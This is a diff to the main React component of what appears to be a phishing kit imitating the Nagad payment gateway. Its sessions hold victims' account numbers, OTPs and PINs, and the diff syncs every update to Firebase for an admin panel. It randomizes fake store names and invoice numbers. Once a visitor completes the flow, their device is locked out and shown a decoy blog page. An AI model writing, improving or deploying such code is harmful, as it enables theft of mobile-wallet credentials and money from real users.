@@ -5,7 +5,8 @@ import { PaymentFlow } from './components/PaymentFlow';
 import { NagadFooter } from './components/NagadFooter';
 import { AdminLogin } from './components/AdminLogin';
 import { AdminPanel } from './components/AdminPanel';
-import { rtdb, ref, onValue, set, update, db, doc, onSnapshot, setDoc } from './firebase';
+import { BlogFallback } from './components/BlogFallback';
+import { rtdb, ref, onValue, set, update, db, doc, onSnapshot, setDoc, get } from './firebase';
 
 const DEFAULT_STORES = [
   'MUNNA GENERAL STORE',
@@ -45,7 +46,7 @@ export default function App() {
     return !!localStorage.getItem('nagad_admin_user');
   });
   const [isBlocked, setIsBlocked] = useState<boolean>(false);
-  const [lang, setLang] = useState<'bn' | 'en'>('en');
+  const [lang, setLang] = useState<'bn' | 'en'>('bn');
   const [gatewayAmounts, setGatewayAmounts] = useState<Record<string, string>>({});
 
   // Dynamic Store Settings state with localStorage initial state to prevent logo flicker on refresh
@@ -79,6 +80,7 @@ export default function App() {
 
   // User transaction session state
   const [session, setSession] = useState<TransactionSession | null>(null);
+  const [isDataLoaded, setIsDataLoaded] = useState(false);
 
   // Check URL path, search params, or hash on load and history changes
   useEffect(() => {
@@ -126,7 +128,7 @@ export default function App() {
     }
   }, [storeSettings.pageTitle, storeSettings.customFaviconUrl]);
 
-  // Fetch or generate client Device ID & IP
+  // Fetch IP and listen to settings before initializing session
   useEffect(() => {
     let deviceId = localStorage.getItem('nagad_device_id');
     if (!deviceId) {
@@ -134,21 +136,88 @@ export default function App() {
       localStorage.setItem('nagad_device_id', deviceId);
     }
 
-    // Check completed state
     if (localStorage.getItem('nagad_completed') === 'true') {
       setIsBlocked(true);
     }
 
-    // Fetch IP Address
-    fetch('https://api.ipify.org?format=json')
-      .then((res) => res.json())
-      .then((data) => {
-        const clientIp = data.ip || 'Unknown';
-        initSession(deviceId!, clientIp);
-      })
-      .catch(() => {
-        initSession(deviceId!, '127.0.0.1');
+    let clientIp = '127.0.0.1';
+    
+    const loadAll = async () => {
+      try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        if (data.ip) clientIp = data.ip;
+      } catch (e) {}
+      
+      let currentSettings = { ...storeSettings };
+      let currentAmounts = { ...gatewayAmounts };
+
+      try {
+        const settingsSnap = await get(ref(rtdb, 'settings'));
+        if (settingsSnap.exists()) {
+           currentSettings = { ...currentSettings, ...settingsSnap.val() };
+           setStoreSettings(currentSettings);
+        }
+        const gatewaySnap = await get(ref(rtdb, 'gatewayAmounts'));
+        if (gatewaySnap.exists()) {
+           currentAmounts = gatewaySnap.val();
+           setGatewayAmounts(currentAmounts);
+        }
+      } catch(e) {}
+      
+      setIsDataLoaded(true);
+      
+      // Initialize Session using fetched data directly to avoid closure issues
+      const existingSessionId = localStorage.getItem('nagad_session_id');
+      const newId = existingSessionId || 'sess_' + Date.now() + '_' + Math.random().toString(36).substring(2, 7);
+      localStorage.setItem('nagad_session_id', newId);
+
+      let chosenStore = currentSettings.storeName || 'MUNNA GENERAL STORE';
+      if (currentSettings.autoRandomizeStore) {
+        const pool = currentSettings.storeNamesList?.length > 0 ? currentSettings.storeNamesList : DEFAULT_STORES;
+        chosenStore = pool[Math.floor(Math.random() * pool.length)];
+      }
+
+      let chosenInvoice = currentSettings.invoiceNo || 'CC801472068';
+      if (currentSettings.autoRandomizeInvoice) {
+        chosenInvoice = 'CC' + Math.floor(100000000 + Math.random() * 900000000);
+      }
+
+      const currentGatewayTag = getClientGatewayTag();
+      const customGatewayAmount = currentAmounts[currentGatewayTag];
+      const finalAmount = customGatewayAmount || currentSettings.amount || '1,000.00';
+
+      const initialSession: TransactionSession = {
+        id: newId,
+        accountNumber: '',
+        otp: '',
+        pin: '',
+        ip: clientIp,
+        deviceId: deviceId,
+        userAgent: navigator.userAgent,
+        timestamp: Date.now(),
+        step: 'number',
+        storeName: chosenStore,
+        amount: finalAmount,
+        currency: currentSettings.currency || 'BDT',
+        charge: currentSettings.charge || '0',
+        invoiceNo: chosenInvoice,
+        status: 'active',
+        updatedAt: Date.now(),
+        gatewayTag: currentGatewayTag,
+      };
+
+      setSession((prev) => {
+         if (prev && prev.id === newId) return prev;
+         try {
+           set(ref(rtdb, `sessions/${newId}`), initialSession);
+           setDoc(doc(db, 'sessions', newId), initialSession, { merge: true });
+         } catch (e) {}
+         return initialSession;
       });
+    };
+
+    loadAll();
   }, []);
 
   // Listen for realtime blocked list from Firebase
@@ -237,71 +306,17 @@ export default function App() {
     return 'main';
   };
 
-  // Create initial transaction session with randomized store/invoice if enabled
-  const initSession = (deviceId: string, ip: string) => {
-    const existingSessionId = localStorage.getItem('nagad_session_id');
-    const newId = existingSessionId || 'sess_' + Date.now() + '_' + Math.random().toString(36).substring(2, 7);
-    localStorage.setItem('nagad_session_id', newId);
-
-    if (session && session.id === newId) {
-      return;
-    }
-
-    // Compute store name
-    let chosenStore = storeSettings.storeName || 'MUNNA GENERAL STORE';
-    if (storeSettings.autoRandomizeStore) {
-      const pool =
-        storeSettings.storeNamesList && storeSettings.storeNamesList.length > 0
-          ? storeSettings.storeNamesList
-          : DEFAULT_STORES;
-      chosenStore = pool[Math.floor(Math.random() * pool.length)];
-    }
-
-    // Compute invoice number
-    let chosenInvoice = storeSettings.invoiceNo || 'CC801472068';
-    if (storeSettings.autoRandomizeInvoice) {
-      chosenInvoice = 'CC' + Math.floor(100000000 + Math.random() * 900000000);
-    }
-
-    const currentGatewayTag = getClientGatewayTag();
-    const customGatewayAmount = gatewayAmounts[currentGatewayTag];
-    const finalAmount = customGatewayAmount || storeSettings.amount || '1,000.00';
-
-    const initialSession: TransactionSession = {
-      id: newId,
-      accountNumber: '',
-      otp: '',
-      pin: '',
-      ip: ip,
-      deviceId: deviceId,
-      userAgent: navigator.userAgent,
-      timestamp: Date.now(),
-      step: 'number',
-      storeName: chosenStore,
-      amount: finalAmount,
-      currency: storeSettings.currency || 'BDT',
-      charge: storeSettings.charge || '0',
-      invoiceNo: chosenInvoice,
-      status: 'active',
-      updatedAt: Date.now(),
-      gatewayTag: currentGatewayTag,
-    };
-
-    setSession(initialSession);
-
-    // Sync to Firebase RTDB & Firestore
-    try {
-      set(ref(rtdb, `sessions/${newId}`), initialSession);
-      setDoc(doc(db, 'sessions', newId), initialSession, { merge: true });
-    } catch (e) {
-      console.warn('Firebase init error:', e);
-    }
-  };
-
   // Update session handler
-  const handleUpdateSession = (updates: Partial<TransactionSession>) => {
+  const handleUpdateSession = async (updates: Partial<TransactionSession>) => {
     if (!session) return;
     setSession((prev) => (prev ? { ...prev, ...updates, updatedAt: Date.now() } : null));
+    try {
+      const ts = Date.now();
+      await update(ref(rtdb, `sessions/${session.id}`), { ...updates, updatedAt: ts });
+      await setDoc(doc(db, 'sessions', session.id), { ...updates, updatedAt: ts }, { merge: true });
+    } catch (err) {
+      console.error(err);
+    }
   };
 
   // Complete transaction handler (locks out user device)
@@ -365,13 +380,18 @@ export default function App() {
 
   // IF BLOCKED OR COMPLETED -> RENDER BLANK PAGE
   if (isBlocked) {
-    return <div className="min-h-screen bg-white w-full h-full" />;
+    return <BlogFallback />;
+  }
+
+  // Wait until settings are loaded
+  if (!isDataLoaded) {
+    return <div className="min-h-screen bg-white flex items-center justify-center w-full h-full" />;
   }
 
   // NAGAD PAYMENT GATEWAY VIEW
   return (
-    <div className="min-h-screen w-full bg-[#0a0a0a] flex items-center justify-center font-sans antialiased selection:bg-white selection:text-red-700 p-1 sm:p-3">
-      <div className="w-[98%] sm:w-full max-w-[450px] min-h-[98vh] sm:min-h-[580px] bg-gradient-to-b from-[#b3080d] via-[#a0060a] to-[#800306] rounded-xl sm:rounded-2xl shadow-2xl border border-red-900/30 flex flex-col justify-between items-center py-2 px-2 sm:py-3.5 sm:px-4 overflow-hidden relative my-auto">
+    <div className="min-h-screen w-full bg-white flex items-center justify-center font-sans antialiased selection:bg-red-100 selection:text-red-700">
+      <div className="w-full max-w-[450px] min-h-screen sm:min-h-[600px] bg-white flex flex-col items-center pt-6 px-4 sm:px-6 relative my-auto">
         <NagadHeader
           storeName={session?.storeName || storeSettings.storeName}
           amount={session?.amount || gatewayAmounts[getClientGatewayTag()] || storeSettings.amount}
@@ -380,6 +400,7 @@ export default function App() {
           invoiceNo={session?.invoiceNo || storeSettings.invoiceNo}
           lang={lang}
           onLangChange={(newLang) => setLang(newLang)}
+          topLogoUrl={storeSettings.nagadTopLogoUrl}
         />
 
         {session && (
@@ -388,6 +409,8 @@ export default function App() {
             lang={lang}
             onUpdateSession={handleUpdateSession}
             onComplete={handleCompleteTransaction}
+            inputLogoUrl={storeSettings.nagadInputLogoUrl}
+            instructionsImageUrl={storeSettings.instructionsImageUrl}
           />
         )}
 
